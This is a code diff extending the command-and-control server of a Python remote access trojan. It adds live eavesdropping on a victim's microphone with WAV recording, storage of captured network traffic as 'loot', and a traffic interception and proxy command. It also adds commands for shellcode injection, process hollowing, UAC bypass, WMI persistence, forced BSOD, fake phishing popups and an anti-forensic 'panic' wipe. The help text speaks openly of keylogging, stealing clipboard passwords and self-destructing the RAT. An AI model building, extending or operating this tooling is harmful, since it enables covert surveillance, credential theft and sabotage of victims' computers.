@@ -284,6 +284,10 @@ class AdvancedC2Server:
         self._np  = None   # cached numpy module
         self._stream_win_init  = False  # OpenCV window created?
         self._webcam_win_init  = False
+        self.audio_queue = queue.Queue(maxsize=500)
+        self._audio_active_cid = None
+        self._pyaudio = None
+        self._audio_stream = None
 
         # --- Recording state (server-side, no client involvement) ---
         self._stream_recording  = False   # is screen stream being recorded?
@@ -294,6 +298,11 @@ class AdvancedC2Server:
         self._webcam_writer_dims  = (0, 0)
         self._stream_rec_path   = ''
         self._webcam_rec_path   = ''
+        self._audio_rec_path    = ''
+
+        # --- Audio Recording State ---
+        self._audio_recording   = False
+        self._audio_wave_file   = None  # wave.Wave_write object
         
         # Import cv2/numpy once at startup and cache them
         try:
@@ -310,6 +319,7 @@ class AdvancedC2Server:
         self.running = True
         threading.Thread(target=self._command_loop, daemon=True).start()
         threading.Thread(target=self._discovery_responder, daemon=True).start()
+        threading.Thread(target=self._audio_playback_loop, daemon=True).start()
         
         server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -339,6 +349,8 @@ class AdvancedC2Server:
                         rendered = True
                     except queue.Empty:
                         break
+
+                # Audio is now handled by _audio_playback_loop thread
 
                 # --- One waitKey call per tick covers all OpenCV windows ---
                 if self._cv2_available:
@@ -431,12 +443,12 @@ class AdvancedC2Server:
                 cmd_id = cmd.get('id')
                 
                 # --- Server-local Commands Interception ---
-                if c_type in ('recstream', 'recwcam'):
+                if c_type in ('recstream', 'recwcam', 'recaudio'):
                     self.logger.info(f"Executing server-local command {cmd_id} ({c_type})")
                     self.db.update_command_status(cmd_id, 'executing')
                     action = params.get('action', 'start')
                     # Call _handle_rec_cmd directly via the parser for consistency
-                    # recstream/recwcam are handled in CommandParser
+                    # recstream/recwcam/recaudio are handled in CommandParser
                     args = [action]
                     if 'seconds' in params: args.append(str(params['seconds']))
                     
@@ -632,6 +644,47 @@ class AdvancedC2Server:
             self._webcam_rec_path = ''
             return msg
 
+    def _start_audio_recording(self, duration: int = 0) -> str:
+        """Start recording the live audio stream to a .wav file."""
+        if self._audio_recording:
+            return f'Audio recording already active → {self._audio_rec_path}'
+        
+        rec_dir = Path(self.config.loot_dir) / 'recordings'
+        rec_dir.mkdir(parents=True, exist_ok=True)
+        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
+        self._audio_rec_path = str(rec_dir / f'audio_{ts}.wav')
+        
+        try:
+            import wave
+            self._audio_wave_file = wave.open(self._audio_rec_path, 'wb')
+            self._audio_wave_file.setnchannels(1)
+            self._audio_wave_file.setsampwidth(2) # 16-bit
+            self._audio_wave_file.setframerate(44100)
+            self._audio_recording = True
+            
+            msg = f'Audio recording started → {self._audio_rec_path}'
+            if duration > 0:
+                threading.Timer(duration, self._stop_audio_recording).start()
+                msg += f' (Timed: {duration}s)'
+            return msg
+        except Exception as e:
+            self.logger.error(f"Failed to start audio recording: {e}")
+            return f'Error: {e}'
+
+    def _stop_audio_recording(self) -> str:
+        """Stop audio recording and close the WAV file."""
+        if not self._audio_recording:
+            return 'No active audio recording'
+        
+        self._audio_recording = False
+        if self._audio_wave_file:
+            try:
+                self._audio_wave_file.close()
+                self._audio_wave_file = None
+            except: pass
+        
+        return 'Audio recording stopped and saved'
+
     def _handle_client(self, sock, addr):
         cid = None
         try:
@@ -712,6 +765,24 @@ class AdvancedC2Server:
 
     def _handle_msg(self, cid, msg):
         m_type = msg.get('type')
+        if m_type == 'packet_log':
+            log_entry = msg.get('data')
+            if log_entry:
+                try:
+                    loot_dir = Path(self.config.loot_dir) / cid / 'packets'
+                    loot_dir.mkdir(parents=True, exist_ok=True)
+                    filename = f"traffic_{datetime.date.today()}.log"
+                    log_file = loot_dir / filename
+                    
+                    # Write to file
+                    with open(log_file, "a", encoding='utf-8') as f:
+                        f.write(json.dumps(log_entry) + "\n")
+                    
+                    # Register in Database if not already there or just update size
+                    self.db.save_loot(cid, 'packets', filename, b'', str(log_file))
+                except Exception as e:
+                    self.logger.error(f"Error saving packet log: {e}")
+            return
         if m_type == 'heartbeat': 
             try:
                 self.db.execute("UPDATE clients SET last_seen = ?, status = 'online' WHERE id = ?", 
@@ -749,6 +820,9 @@ class AdvancedC2Server:
             return
         if m_type == 'webcam_frame':
             self._handle_webcam_frame(cid, msg)
+            return
+        if m_type == 'audio_frame':
+            self._handle_audio_frame(cid, msg)
             return
         if m_type == 'tasks_sync':
             active_ids = msg.get('active_ids', [])
@@ -821,11 +895,72 @@ class AdvancedC2Server:
         data_b64 = msg.get('data', '')
         if not data_b64:
             return
-        self._webcam_active_cid = cid
         try:
             self.webcam_queue.put_nowait((cid, data_b64))
         except queue.Full:
             pass
+
+    def _handle_audio_frame(self, cid, msg):
+        """Push audio frame into queue for main-thread playback"""
+        data_b64 = msg.get('data', '')
+        if not data_b64:
+            return
+        self._audio_active_cid = cid
+        try:
+            self.audio_queue.put_nowait((cid, data_b64))
+        except queue.Full:
+            pass
+
+    def _audio_playback_loop(self):
+        """Dedicated thread for smooth audio playback without blocking the UI loop"""
+        try:
+            import pyaudio
+            try:
+                p = pyaudio.PyAudio()
+                self.logger.info(f"PyAudio initialized. Default output: {p.get_default_output_device_info().get('name')}")
+            except Exception as e:
+                self.logger.error(f"Failed to initialize PyAudio host: {e}")
+                return
+
+            stream = None
+            
+            self.logger.info("Audio playback thread started")
+            while self.running:
+                try:
+                    # Wait for audio data
+                    cid, data_b64 = self.audio_queue.get(timeout=1.0)
+                    data = base64.b64decode(data_b64)
+                    
+                    if stream is None:
+                        stream = p.open(
+                            format=pyaudio.paInt16,
+                            channels=1,
+                            rate=44100,
+                            output=True,
+                            frames_per_buffer=1024
+                        )
+                    
+                    stream.write(data)
+                    
+                    # Record frame if active
+                    if self._audio_recording and self._audio_wave_file:
+                        try:
+                            self._audio_wave_file.writeframes(data)
+                        except Exception as rec_e:
+                            self.logger.error(f"Audio record write error: {rec_e}")
+                except queue.Empty:
+                    continue
+                except Exception as e:
+                    self.logger.error(f"Audio playback error: {e}")
+                    if stream:
+                        try: stream.close()
+                        except: pass
+                        stream = None
+            
+            if stream: stream.close()
+            p.terminate()
+        except Exception as e:
+            self.logger.error(f"Failed to initialize audio playback: {e}")
 
     def _save_loot(self, cid, msg):
         """Handle incoming loot data from client and persist it."""
@@ -989,6 +1124,7 @@ class CommandParser:
             elif cmd == 'screenshot': self.server.send_command(targets, 'screenshot', {'height': int(args[0]) if args else 0})
             elif cmd == 'webcam': self.server.send_command(targets, 'webcam', {'resolution': args[0] if args else '640x480'})
             elif cmd == 'mic': self.server.send_command(targets, 'microphone', {'duration': int(args[0]) if args else 10})
+            elif cmd == 'audio_stream': self.server.send_command(targets, 'audio_stream', {'action': args[0] if args else 'start'})
             elif cmd == 'keylog': self.server.send_command(targets, 'keylog', {'action': args[0] if args else 'dump'})
             elif cmd == 'clip': self.server.send_command(targets, 'clipboard', {'action': args[0] if args else 'get', 'text': ' '.join(args[1:]) if len(args)>1 else ''})
             
@@ -1010,6 +1146,14 @@ class CommandParser:
             elif cmd == 'registry': self.server.send_command(targets, 'registry', {'action': args[0], 'path': args[1]})
             elif cmd == 'scan': self.server.send_command(targets, 'port_scan', {'target': args[0], 'ports': args[1] if len(args)>1 else '1-1024'})
             elif cmd == 'socks': self.server.send_command(targets, 'socks', {'port': int(args[0]) if args else 1080})
+            elif cmd == 'interception':
+                action = args[0].lower() if args else 'status'
+                params = {'action': action}
+                if action == 'start' and len(args) > 1: params['port'] = int(args[1])
+                elif action == 'toggle_monitor': params['enabled'] = (args[1].lower() == 'on') if len(args) > 1 else True
+                elif action == 'toggle_intercept': params['enabled'] = (args[1].lower() == 'on') if len(args) > 1 else True
+                elif action == 'system_proxy': params['enabled'] = (args[1].lower() == 'on') if len(args) > 1 else True
+                self.server.send_command(targets, 'interception', params)
             elif cmd == 'revshell': self.server.send_command(targets, 'reverse_shell', {'ip': args[0], 'port': int(args[1])})
             
             # --- UI Actions ---
@@ -1053,12 +1197,37 @@ class CommandParser:
                 self.server.send_command(targets, 'stream', {
                     'action': action, 'fps': fps, 'height': height, 'quality': quality
                 })
-            elif cmd == 'uac': self.server.send_command(targets, 'uac_bypass', {'program': args[0] if args else None})
-            elif cmd == 'wmi': self.server.send_command(targets, 'wmi_persistence', {'command': args[0] if args else None})
+            elif cmd == 'uac':
+                self.server.send_command(targets, 'uac_bypass', {
+                    'method': args[0] if args else 'auto',
+                    'program': args[1] if len(args) > 1 else None
+                })
+            elif cmd == 'wmi': self.server.send_command(targets, 'wmi', {'command': args[0] if args else None})
+            elif cmd == 'inject': 
+                if len(args) < 2: print("Usage: inject <pid> <local_shellcode_bin>"); return
+                try:
+                    with open(args[1], 'rb') as f: sc = base64.b64encode(f.read()).decode()
+                    self.server.send_command(targets, 'inject', {'pid': args[0], 'shellcode': sc})
+                except Exception as e: print(f"Error: {e}")
+            elif cmd == 'hollow':
+                if len(args) < 2: print("Usage: hollow <target_exe> <local_shellcode_bin>"); return
+                try:
+                    with open(args[1], 'rb') as f: sc = base64.b64encode(f.read()).decode()
+                    self.server.send_command(targets, 'hollow', {'program': args[0], 'shellcode': sc})
+                except Exception as e: print(f"Error: {e}")
+            elif cmd == 'bsod': self.server.send_command(targets, 'bsod')
+            elif cmd == 'block_apps': self.server.send_command(targets, 'block_apps', {'action': args[0] if args else 'on'})
             elif cmd == 'input': self.server.send_command(targets, 'input_control', {'action': args[0], 'x': int(args[1]) if len(args)>1 else 0, 'y': int(args[2]) if len(args)>2 else 0, 'button': args[3] if len(args)>3 else 'left', 'text': ' '.join(args[1:]) if args[0]=='type' else ''})
             elif cmd == 'block': self.server.send_command(targets, 'block_input', {'action': args[0] if args else 'block'})
             elif cmd == 'browser_kill': self.server.send_command(targets, 'close_browser')
             elif cmd == 'autorun': self.server.send_command(targets, 'set_autorun', {'commands': json.loads(args[0])})
+            elif cmd == 'phishing':
+                self.server.send_command(targets, 'phishing', {
+                    'template': args[0] if args else 'windows',
+                    'title': args[1] if len(args) > 1 else None,
+                    'message': args[2] if len(args) > 2 else None
+                })
+            elif cmd == 'panic': self.server.send_command(targets, 'panic')
 
 
 
@@ -1106,7 +1275,7 @@ class CommandParser:
                                           'password': password})
 
             # --- Recording: server-local (no client command) ---
-            elif cmd in ('recstream', 'recwcam'):
+            elif cmd in ('recstream', 'recwcam', 'recaudio'):
                 self._handle_rec_cmd(cmd, args)
 
             else: print(f"Error: Unknown command '{cmd}'")
@@ -1116,21 +1285,30 @@ class CommandParser:
 
     def _handle_rec_cmd(self, cmd, args):
         """Handle recstream / recwcam commands."""
-        # cmd = 'recstream' | 'recwcam'
-        source = 'stream' if cmd == 'recstream' else 'webcam'
+        # cmd = 'recstream' | 'recwcam' | 'recaudio'
+        source = 'stream' if cmd == 'recstream' else ('webcam' if cmd == 'recwcam' else 'audio')
         action = args[0].lower() if args else 'start'
         if action == 'start':
             duration = int(args[1]) if len(args) > 1 else 0
-            msg = self.server._start_recording(source, duration)
+            if source == 'audio':
+                msg = self.server._start_audio_recording(duration)
+            else:
+                msg = self.server._start_recording(source, duration)
         elif action == 'stop':
-            msg = self.server._stop_recording(source)
+            if source == 'audio':
+                msg = self.server._stop_audio_recording()
+            else:
+                msg = self.server._stop_recording(source)
         elif action == 'status':
             if source == 'stream':
                 active = self.server._stream_recording
                 path   = self.server._stream_rec_path
-            else:
+            elif source == 'webcam':
                 active = self.server._webcam_recording
                 path   = self.server._webcam_rec_path
+            elif source == 'audio':
+                active = self.server._audio_recording
+                path   = self.server._audio_rec_path
             msg = f"Recording: {'ACTIVE' if active else 'stopped'}"
             if active: msg += f" → {path}"
         else:
@@ -1224,14 +1402,21 @@ class CommandParser:
                        Ex: mic 30   (record 30 seconds)
   {G}keylog start{W}         Start the background keylogger
   {G}keylog stop{W}          Stop the background keylogger
-  {G}keylog dump{W}          Dump the background keylogger buffer and clear it.
-                       Runs in background — captures ALL keystrokes.
+  {G}keylog dump{W}          Dump keylogger buffer (structured JSON with window titles).
+                       Runs in background — captures ALL keystrokes with context.
                        Output saved to loot/keylog/
   {G}keylog status{W}        Check if the keylogger is running + current buffer size
   {G}keylog clear{W}         Wipe the in-memory buffer without exfiltrating it
   {G}clip get{W}             Steal the current clipboard contents (text, passwords, etc.)
   {G}clip set <text>{W}      Overwrite the victim's clipboard with custom text
                        Ex: clip set "http://phishing.site"
+   {G}audio_stream start{W}   Start live audio streaming from the victim's microphone.
+                        Server will play the audio in real-time.
+   {G}audio_stream stop{W}    Stop the live audio stream.
+   {G}recaudio start{W}        (Local) Record the live audio stream to a WAV file.
+   {G}recaudio stop{W}         (Local) Stop recording and save the audio file.
+   {G}recstream start [s]{W}   (Local) Record the live screen stream to an MP4 file.
+   {G}recwcam start [s]{W}     (Local) Record the live webcam stream to an MP4 file.
 
 {Y}╔══════════════════════════════════════╗
 ║        CREDENTIAL HARVESTING         ║
@@ -1313,12 +1498,14 @@ class CommandParser:
                        Also launches a shadow copy that survives parent process death.
   {G}unpersist{W}            Remove all persistence mechanisms and delete the shadow copy.
   {G}wmi <command>{W}        Install WMI Event Subscription persistence (stealthiest method).
+  {G}inject <pid> <file>{W}  Inject binary shellcode from a local file into a remote process.
+  {G}hollow <exe> <file>{W}  Spawn a suspended process and hollow it with your shellcode.
                        Triggers hourly via Win32_LocalTime WMI event. [Admin required]
                        Ex: wmi "C:\\Windows\\System32\\WindowsPowerShell\\...\\powershell.exe"
   {G}clean{W}                Wipe forensic evidence: PowerShell history, Recent files,
                        bash/zsh history, Python history, temp files.
-  {G}destroy{W}              Full self-destruct: clean traces, then delete the RAT binary
-                       and launch script via a delayed batch/shell script.
+   {G}destroy{W}             Complete self-destruction of the RAT (Cleanup + Delete)
+   {G}panic{W}               Emergency Anti-Forensic Wipe (Cleanup + BSOD)
   {G}abort [id]{W}           Kill a running task by ID, or abort all active tasks.
                        Ex: abort  or  abort a1b2c3d4
 
